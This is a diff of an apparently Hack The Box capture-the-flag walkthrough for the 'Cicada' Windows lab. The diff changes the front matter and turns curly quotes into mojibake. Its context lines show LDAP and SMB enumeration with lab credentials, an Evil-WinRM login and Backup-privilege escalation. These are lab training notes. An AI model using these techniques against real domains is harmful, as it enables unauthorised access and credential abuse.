@@ -1,9 +1,7 @@
----
+﻿---
 title: 'Cicada Walkthrough: Exploiting Shared Access from Guest User Privileges'
 date: 2024-10-30 20:00:00 +0530
-categories:
-- Capture the Flags
-- Windows
+categories: [red-teaming]
 tags:
 - HTB
 - smb
@@ -141,7 +139,7 @@ smb: \> ls
 
 ```
 
-“Notice from HR.txt” has an interesting information 
+â€œNotice from HR.txtâ€ has an interesting information 
 
 ```bash
 Dear new hire!
@@ -281,7 +279,7 @@ Filtering Distinguished Names and Descriptions for Interesting Strings
 ldapsearch -x -H ldap://10.10.11.35 -D 'CICADA\michael.wrightson' -w 'Cicada$M6Corpb*@Lp#nZp!8' -b "DC=cicada,DC=htb"  distinguishedName description
 ```
 
-Finding Password for “David Orelious”
+Finding Password for â€œDavid Oreliousâ€
 
 ```jsx
 # David Orelious, Users, cicada.htb
@@ -291,7 +289,7 @@ distinguishedName: CN=David Orelious,CN=Users,DC=cicada,DC=htb
 
 ```
 
-Enumerating Share Access for “David Orelious”
+Enumerating Share Access for â€œDavid Oreliousâ€
 
 ```jsx
 netexec smb 10.10.11.35 -u 'david.orelious' --password 'aRt$Lp#7t*VQ!3' --shares
@@ -309,7 +307,7 @@ SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ        
 SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share
 ```
 
-Enumerating Files in the DEV Share with David’s Credentials
+Enumerating Files in the DEV Share with Davidâ€™s Credentials
 
 ```jsx
 smbclient //10.10.11.35/DEV -U 'david.orelious'
@@ -345,7 +343,7 @@ The user has READ, WRITE access to C$ share
 
 ![image.png]({ '/assets/img/Cicada/image%201.png' | relative_url })
 
-Logging into the share as “emily.oscars”
+Logging into the share as â€œemily.oscarsâ€
 
 ![image.png]({ '/assets/img/Cicada/image%202.png' | relative_url })
 
@@ -353,7 +351,7 @@ Fetching the flag from the user desktop
 
 ![image.png]({ '/assets/img/Cicada/image%203.png' | relative_url })
 
-Logged in to the machine as emily.oscars leveraging “Evil-Winrm”.
+Logged in to the machine as emily.oscars leveraging â€œEvil-Winrmâ€.
 
 ```bash
 *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /all
@@ -409,7 +407,7 @@ User emily.oscars has the Backup privilege enabled. Uploading the necessary modu
 
 ```
 
-Using robocopy to copy the Administrator’s desktop files to a temporary folder.
+Using robocopy to copy the Administratorâ€™s desktop files to a temporary folder.
 
 ![image.png]({ '/assets/img/Cicada/image%204.png' | relative_url })
 
@@ -425,3 +423,4 @@ Accessing root.txt
 [SMB Enumeration Cheatsheet | 0xdf hacks stuff](https://0xdf.gitlab.io/cheatsheets/smb-enum)
 
 [Leveraging LDAP](https://github.com/k4sth4/SeBackupPrivilege)
+
